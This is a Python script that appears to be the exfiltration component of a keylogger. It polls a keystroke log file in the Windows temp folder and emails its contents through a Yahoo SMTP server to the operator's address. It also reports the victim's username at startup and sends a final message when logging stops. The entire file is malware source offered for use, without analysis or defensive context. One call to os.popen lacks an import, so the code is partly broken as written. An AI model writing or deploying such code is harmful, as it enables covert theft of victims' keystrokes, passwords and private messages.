#!/usr/bin/python

import smtplib
import sys
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

email = 'youremail' # Replace
passw = 'yourpassword' # Replace
logfile = 'C:\\Windows\\temp\\logfile.txt'
mailserver = 'smtp.mail.yahoo.com' # Replace With Your Email Provider Server
count = 1
previous = ''

def Send():
    global count
    global previous
    while ReadLogFile() == previous or len(ReadLogFile()) == 0:
        continue
    smtp = smtplib.SMTP(mailserver, 587)
    smtp.ehlo()
    smtp.starttls()
    smtp.login(email, passw)
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Key #{}'.format(count)
    previous = ReadLogFile()
    msg.attach(MIMEText(ReadLogFile()))
    smtp.sendmail(email, email, msg.as_string())
    count += 1
    if 'Done!!' in ReadLogFile():
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Key #{}'.format('LAST')
        msg.attach(MIMEText('\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'))
        smtp.sendmail(email, email, msg.as_string())
        smtp.close()
        sys.exit(0)
    smtp.close()
    sleep(150)

def ReadLogFile():
    try:
        with open(logfile, 'r') as fp:
            return fp.read()
    except:
        return ''

def main():
    smtp = smtplib.SMTP(mailserver, 587)
    smtp.ehlo()
    smtp.starttls()
    smtp.login(email, passw)
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Initializing Key Logging On {}'.format(os.popen('whoami'))
    smtp.sendmail(email, email, msg.as_string())
    smtp.close()
    while True:
        Send()

if __name__ == '__main__':
    main()
    
